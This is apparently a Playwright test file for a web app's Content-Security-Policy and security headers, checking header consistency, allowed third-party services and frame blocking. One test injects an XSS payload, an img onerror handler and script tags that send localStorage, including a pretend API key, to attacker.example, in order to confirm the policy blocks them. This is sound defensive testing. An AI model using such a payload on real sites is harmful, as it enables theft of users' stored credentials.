import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import type { Browser } from '@playwright/test'
import { PORT } from './lib/server'
import { expectations, ROUTES } from './routes'
import { expect, go, open, test, type Page, type View } from './fixtures'

/**
 * The site's security headers and its Content-Security-Policy (public/_headers, which Cloudflare
 * Pages sends with every file and the test server sends too, see vite.config.ts). The policy says
 * where the app may load code and pictures from and which servers it may talk to:
 *  - the test server sends exactly what public/_headers says, and the desktop app's copy of the
 *    policy (src-tauri/tauri.conf.json) is the same, plus the desktop app's own messaging (ipc);
 *  - the speech engine's download folder on jsDelivr names the version the app really uses;
 *  - code slipped into a page doesn't run, and nothing can be sent to another site, while every
 *    service the app uses (the cloud, Claude, AssemblyAI, Hugging Face, Discord…) stays reachable;
 *  - no other site can show the app inside a frame;
 *  - every screen in routes.ts opens, for the GM and for players, without breaking the policy.
 */

const ROOT = join(import.meta.dirname, '..')
const read = (file: string) => readFileSync(join(ROOT, file), 'utf8')
const BASE = `http://localhost:${PORT}`

/** The headers public/_headers gives every file ("/*"), the way Cloudflare Pages reads the file. */
function siteHeaders() {
  const out: Record<string, string> = {}
  let rule = ''
  for (const line of read('public/_headers').split(/\r?\n/)) {
    if (!line.trim() || line.trim().startsWith('#')) continue
    if (!/^\s/.test(line)) rule = line.trim()
    else if (rule === '/*') out[line.slice(0, line.indexOf(':')).trim()] = line.slice(line.indexOf(':') + 1).trim()
  }
  return out
}

/** A policy as its directives, each with its sources sorted (their order doesn't matter). */
const directives = (policy: string) =>
  Object.fromEntries(
    policy
      .split(';')
      .map((d) => d.trim().split(/\s+/))
      .filter((d) => d[0])
      .map(([name, ...sources]) => [name, sources.sort()]),
  )

const webPolicy = () => directives(siteHeaders()['Content-Security-Policy'] ?? '')
const desktopPolicy = () => {
  const csp = JSON.parse(read('src-tauri/tauri.conf.json')).app.security.csp as Record<string, string | string[]> | null
  return Object.fromEntries(Object.entries(csp ?? {}).map(([name, sources]) => [name, [sources].flat().join(' ').split(/\s+/).sort()]))
}

/** The jsDelivr folder transformers.js downloads the speech engine (onnxruntime-web) from, for the version it depends on. */
function speechEngineFolder() {
  const lock = JSON.parse(read('package-lock.json')).packages as Record<string, { version: string }>
  const ort = lock['node_modules/@huggingface/transformers/node_modules/onnxruntime-web'] ?? lock['node_modules/onnxruntime-web']
  return `https://cdn.jsdelivr.net/npm/onnxruntime-web@${ort.version}/dist/`
}

/**
 * Collects every Content-Security-Policy violation in a tab (the browser's own report of it), and
 * console errors about the policy or the Permissions-Policy header (an unknown feature name, say).
 */
async function watchPolicy(page: Page) {
  const found: string[] = []
  await page.exposeBinding('__policyViolation', (_source, what: string) => void found.push(what))
  await page.addInitScript(() => {
    const w = window as unknown as { __policyViolation: (what: string) => void }
    document.addEventListener('securitypolicyviolation', (e) => w.__policyViolation(`${e.effectiveDirective} blocked ${e.blockedURI} in ${e.sourceFile || e.documentURI}`))
  })
  page.on('console', (m) => {
    if (/Content.Security.Policy|Permissions.Policy/i.test(m.text())) found.push(`console: ${m.text().slice(0, 300)}`)
  })
  return found
}

/** A tab of its own (no example world), offline like the rest: anything but the test server is refused unless a test answers for it. */
async function offlinePage(browser: Browser) {
  const context = await browser.newContext({ baseURL: BASE, serviceWorkers: 'block' })
  await context.route((url) => url.host !== `localhost:${PORT}`, (route) => route.abort())
  await context.routeWebSocket(/^wss?:\/\/(?!localhost)/, (ws) => ws.close())
  return { context, page: await context.newPage() }
}

test('the test server sends the headers in public/_headers', async ({ request }) => {
  const want = siteHeaders()
  for (const name of ['Content-Security-Policy', 'X-Content-Type-Options', 'Referrer-Policy', 'Strict-Transport-Security', 'Permissions-Policy'])
    expect(want[name], `public/_headers has no ${name}`).toBeTruthy()
  // Cloudflare Pages reads at most 2,000 characters of a line.
  for (const line of read('public/_headers').split(/\r?\n/))
    expect(line.length, `a line of public/_headers is too long for Cloudflare: ${line.slice(0, 60)}…`).toBeLessThanOrEqual(2000)
  // The app, a page inside it, a legal page and the offline helper all get the same.
  for (const path of ['/', '/w/some-world/p/some-page', '/privacy.html', '/sw.js']) {
    const res = await request.get(path)
    expect(res.status(), path).toBe(200)
    const got = res.headers()
    for (const [name, value] of Object.entries(want)) expect(got[name.toLowerCase()], `${name} on ${path}`).toBe(value)
  }
})

test("the desktop app's policy matches the web one, plus its own messaging", () => {
  const web = webPolicy()
  const desktop = desktopPolicy()
  const ipc = ['http://ipc.localhost', 'ipc:']
  expect(Object.keys(web).length).toBeGreaterThan(5)
  expect(
    desktop,
    'src-tauri/tauri.conf.json (app > security > csp) must say what public/_headers says, plus "ipc:" and "http://ipc.localhost" in connect-src',
  ).toEqual({ ...web, 'connect-src': [...web['connect-src'], ...ipc].sort() })
})

test("the speech engine's download folder names the version the app uses", () => {
  const folder = speechEngineFolder()
  const say = `transformers.js now downloads the speech engine from ${folder}: put that folder in script-src and connect-src, in public/_headers and in src-tauri/tauri.conf.json`
  for (const policy of [webPolicy(), desktopPolicy()]) {
    expect(policy['script-src'], say).toContain(folder)
    expect(policy['connect-src'], say).toContain(folder)
  }
})

test("code slipped into a page doesn't run, and nothing can be sent to another site", async ({ browser }) => {
  const { context, page } = await offlinePage(browser)
  const found = await watchPolicy(page)
  await page.route('https://attacker.example/**', (route) => route.fulfill({ status: 204, headers: { 'access-control-allow-origin': '*' } }))
  await page.goto('/privacy.html')
  const result = await page.evaluate(async () => {
    localStorage.setItem('codex.ai', JSON.stringify({ anthropicKey: 'sk-ant-pretend' }))
    // The kind of thing a slip in showing text lets in: a picture whose error handler sends the keys away.
    const steal = `fetch('https://attacker.example/keys', { method: 'POST', body: JSON.stringify(localStorage) })`
    document.body.insertAdjacentHTML('beforeend', `<img src="data:," onerror="window.__ran = true; ${steal}">`)
    // Script from anywhere else, even another package on the jsDelivr the speech engine comes from.
    for (const src of ['https://attacker.example/steal.js', 'https://cdn.jsdelivr.net/gh/someone/evil/steal.js']) {
      const s = document.createElement('script')
      s.src = src
      document.head.append(s)
    }
    let sent = true
    try {
      await fetch('https://attacker.example/keys', { method: 'POST', body: JSON.stringify(localStorage) })
    } catch {
      sent = false
    }
    await new Promise((r) => setTimeout(r, 500))
    return { ran: (window as unknown as { __ran?: boolean }).__ran ?? false, sent }
  })
  expect(result).toEqual({ ran: false, sent: false })
  const blocked = found.filter((f) => !f.startsWith('console:')).join('\n')
  expect(blocked).toContain('script-src-attr blocked inline')
  expect(blocked).toContain('script-src-elem blocked https://attacker.example/steal.js')
  expect(blocked).toContain('script-src-elem blocked https://cdn.jsdelivr.net/gh/someone/evil/steal.js')
  expect(blocked).toContain('connect-src blocked https://attacker.example/keys')
  await context.close()
})

test('every service the app talks to is still allowed', async ({ browser }) => {
  const { context, page } = await offlinePage(browser)
  const found = await watchPolicy(page)
  const folder = speechEngineFolder()
  const answer = { status: 200, headers: { 'access-control-allow-origin': '*', 'content-type': 'text/plain' }, body: 'ok' }
  // (No pretend redirects: the browser would follow one out to the real server.)
  await page.route(/^https:\/\/(?!cdn\.jsdelivr\.net)/, (route) => route.fulfill(answer))
  await page.route(`${folder}**`, (route) =>
    route.fulfill({ ...answer, headers: { ...answer.headers, 'content-type': 'text/javascript' }, body: 'export default "speech engine"' }),
  )
  await page.goto('/')
  const result = await page.evaluate(async (folder) => {
    const get = async (url: string, init?: RequestInit) => {
      try {
        const res = await fetch(url, init)
        return init?.mode === 'no-cors' ? 'sent' : res.status
      } catch (e) {
        return String(e)
      }
    }
    const post = { method: 'POST', body: '{}' }
    const calls: Record<string, unknown> = {
      cloud: await get('https://ysrxumagiiaoihlhofqt.supabase.co/rest/v1/worlds'),
      'cloud files': await get('https://ysrxumagiiaoihlhofqt.supabase.co/functions/v1/shared-asset', post),
      claude: await get('https://api.anthropic.com/v1/messages', post),
      assemblyai: await get('https://api.assemblyai.com/v2/upload', post),
      'speech model': await get('https://huggingface.co/onnx-community/whisper-base/resolve/main/onnx/encoder_model.onnx'),
      // Hugging Face sends the model's big files from its download servers.
      'speech model download': await get('https://cas-bridge.xethub.hf.co/xet-bridge-us/model'),
      'speech model download (older server)': await get('https://cdn-lfs.hf.co/repos/model'),
      'speech engine': await get(`${folder}ort-wasm-simd-threaded.asyncify.wasm`),
      'map pack': await get('https://packs.wardedatlas.com/manifest.json'),
      discord: await get('https://discord.com/api/webhooks/1/token?wait=true', post),
      'discord (old address)': await get('https://ptb.discordapp.com/api/webhooks/1/token?wait=true', post),
      syrinscape: await get('https://syrinscape.com/online/frontend-api/stop-all/?auth_token=x', { method: 'POST', mode: 'no-cors' }),
      'd&d beyond': await get('https://character-service.dndbeyond.com/character/v5/character/123'),
      'd&d beyond portrait': await get('https://www.dndbeyond.com/avatars/1/2/portrait.jpeg'),
      pathbuilder: await get('https://pathbuilder2e.com/json.php?id=123'),
      'portrait from a file': await get('data:image/png;base64,iVBORw0KGgo='),
    }
    // The speech engine runs from jsDelivr, or from a blob: copy of it, and starts its WebAssembly.
    calls['speech engine code'] = (await import(/* @vite-ignore */ `${folder}ort-wasm-simd-threaded.asyncify.mjs`)).default
    calls['speech engine copy'] = (await import(/* @vite-ignore */ URL.createObjectURL(new Blob(['export default "copy"'], { type: 'text/javascript' })))).default
    calls.webassembly = (await WebAssembly.compile(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0]))) instanceof WebAssembly.Module
    // Some libraries start small helpers from blob:.
    calls.helper = await new Promise((resolve) => {
      const w = new Worker(URL.createObjectURL(new Blob(['postMessage("helper")'], { type: 'text/javascript' })))
      w.onmessage = (e) => resolve(e.data)
      w.onerror = () => resolve('failed')
    })
    // A picture from the web in a GM's text, and the live updates.
    calls.picture = await new Promise((resolve) => {
      const img = new Image()
      img.onload = img.onerror = () => resolve('tried')
      img.src = 'https://example.org/picture.png'
    })
    calls.live = await new Promise((resolve) => {
      const ws = new WebSocket('wss://ysrxumagiiaoihlhofqt.supabase.co/realtime/v1/websocket')
      ws.onopen = ws.onerror = ws.onclose = () => resolve('tried')
    })
    return calls
  }, folder)
  expect(result).toEqual({
    cloud: 200,
    'cloud files': 200,
    claude: 200,
    assemblyai: 200,
    'speech model': 200,
    'speech model download': 200,
    'speech model download (older server)': 200,
    'speech engine': 200,
    'map pack': 200,
    discord: 200,
    'discord (old address)': 200,
    syrinscape: 'sent',
    'd&d beyond': 200,
    'd&d beyond portrait': 200,
    pathbuilder: 200,
    'portrait from a file': 200,
    'speech engine code': 'speech engine',
    'speech engine copy': 'copy',
    webassembly: true,
    helper: 'helper',
    picture: 'tried',
    live: 'tried',
  })
  expect(found, 'the policy blocked something the app uses').toEqual([])
  await context.close()
})

test('no site can show the app inside a frame, not even its own pages', async ({ browser }) => {
  const { context, page } = await offlinePage(browser)
  // frame-ancestors 'none' (and X-Frame-Options: DENY, for older browsers) refuse every frame, so
  // another site's frame is refused too. (A pretend other site can't be used here: the browser never
  // lets one frame a page from this computer, with or without the policy.)
  await page.goto('/privacy.html')
  await page.evaluate((src) => document.body.insertAdjacentHTML('beforeend', `<iframe src="${src}" width="600" height="400"></iframe>`), `${BASE}/`)
  await expect.poll(() => page.frames().length).toBe(2)
  await page.waitForTimeout(1000)
  // The browser puts its own error page in the frame instead.
  const framed = page.frames().slice(1).filter((f) => f.url().startsWith(BASE))
  expect(framed.map((f) => f.url()), 'the app opened inside a frame').toEqual([])
  await context.close()
})

for (const view of ['gm', 'player'] as View[])
  test.describe(() => {
    test.use({ view })
    test(`every screen opens without breaking the policy, ${view === 'gm' ? 'GM' : 'player'} view`, async ({ page, world }) => {
      test.setTimeout(600_000)
      const found = await watchPolicy(page)
      const problems: string[] = []
      await open(page, '/')
      for (const route of ROUTES)
        for (const sample of route.samples) {
          if (expectations(route, sample)[view] === 'skip') continue
          const url = world.resolve(sample.url)
          await go(page, url)
          // Pictures and maps come in a moment after the screen.
          await page.waitForTimeout(250)
          problems.push(...found.splice(0).map((f) => `${url}: ${f}`))
        }
      await page.waitForTimeout(1000)
      problems.push(...found.splice(0).map((f) => `after the last screen: ${f}`))
      const say = 'The Content-Security-Policy (public/_headers) blocked something; allow it there and in src-tauri/tauri.conf.json if the app needs it'
      expect(problems, say).toEqual([])
    })
  })
